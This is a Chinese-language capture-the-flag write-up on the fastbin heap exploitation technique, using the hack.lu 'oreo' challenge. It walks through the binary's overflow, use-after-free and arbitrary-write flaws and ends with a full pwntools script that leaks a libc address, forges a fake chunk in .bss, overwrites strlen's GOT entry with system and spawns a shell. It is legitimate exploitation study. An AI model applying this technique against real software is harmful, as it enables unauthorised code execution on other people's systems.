# fastbin原理：<br>
1.堆溢出修改堆块结构中指向下一个堆块的指针,指向伪造的chunk<br>
2.伪造chunk,为了绕过next_size,要保证伪造的chunk的下一个chunk的大小不能太大或者太小<br>
3.然后free这个伪造的chunk,然后malloc一个相同大小的chunk,达成对伪造chunk的读写<br>


## 这里使用hack.lu-oreo记录fastbin的学习小结
![menu](img/menu.png)
add-增加堆块（漏洞点：在dword_804A288+25(name)的地方读取了56个字节，但是总共只申请了0x38=56个字节，所以可以溢出）<br>
gan的结构体为<br>
```
struct{  
    char* description;
    char* name;
    gan* last_heap;
}gan
```
所以这里可以溢出到last_heap<br>

![add](img/add.PNG)<br><br>
show-展示堆块(漏洞点：打印堆块的是，由于可以溢出到last_heap，那么可以将last_heap修改成任意的got表地址，那么在打印堆块的时候，就会将got表地址里面的值当成description打印出来)<br>

![show](img/show.PNG)<br><br>

order-delete堆块(漏洞点:日常不置空)<br>
![delete](img/delete.PNG)<br><br>

leaveMessage(漏洞点：这个函数会往bss段写数据，但是他是往dword_804a2a8这个地址里面的值作为地址写数据，如果这个地址可以控制，那么就可以往任意地址写数据了)<br>
![message](img/message.PNG)<br><br>

## 利用思路<br>
1.泄露基址：利用add溢出使用函数got地址覆盖到last_heap，然后使用show函数打印出来<br>
2.伪造chunk：这里使用bss段也就是message所在的地方伪造chunk，message的起始是0x804a2a8中的值指向的0x804a2c0。可以通过观察发现，0x804a2a8-4是另外一个变量，是add的数量，所以伪造0x40的chunk，就需要add 40次。并且要过free时next_size的检测，所以要在bss段伪造两个chunk,只需要对第二个chunk的大小做一定的伪造即可<br>
3.利用message可以向0x804a2a8中保存的指向的地址写任意内容,如果不做任何修改，默认指向的是0x804a2c0。所以free我们伪造在bss段的chunk,在malloc的时候，可以获取0x804a2a8中的写权限，然后修改0x804a2a8中指向的地址，然后在使用message这个函数，向我们写入的地址中写入任何内容。所以我们可以将strlen_got放在0x804a2a8地址，然后通过message向strlen_got里面写入system_addr的地址，然后在后面调用strlen的时候，就会调用system。


##利用代码
```
from pwn import *

DEBUG=1
if DEBUG:
	context.log_level='debug'
	p=process('./oreo')
	gdb.attach(p,'b *0x80487b5')
else:
	p=remote()

def add(name, description):
	p.sendline('1')	
	p.sendline(name)
	p.sendline(description)


def show():
	p.sendline('2')

def delete():
	p.sendline('3')


def message(notice):
	p.sendline('4')
	p.sendline(notice)

p.readuntil('Exit')
add('a','a')
delete()



#leak free_addr in libc
free_got=0x804a238
payload=27*'A' + p32(free_got)
add(payload, 25*'b')
show()

p.recvuntil('Description: ')
p.recvuntil('Description: ')

free_in_libc=u32(p.recv(4))
success(hex(free_in_libc))

#create fake chunk
for i in range(0x40-2):
	add('a','a')

bss_addr=0x804a2a8
#chunk1
payload='a'*27+p32(bss_addr) 
add(payload,'n')
#chunk2
message('a'*0x1c + '\x00'*4 + 'a'*4 + p32(100))
delete()

#when the func of message write notice to bss_addr, it will write to the addr of what 0x804a2a8 point to 
strlen_got=0x804a250
add('b', p32(strlen_got))

libc=ELF('libc-2.23.so')
libc_base = free_in_libc-libc.symbols['free']
system_addr = libc_base + libc.symbols['system']

success(hex(system_addr))


message(p32(system_addr)+';/bin/sh')
p.interactive()


```


















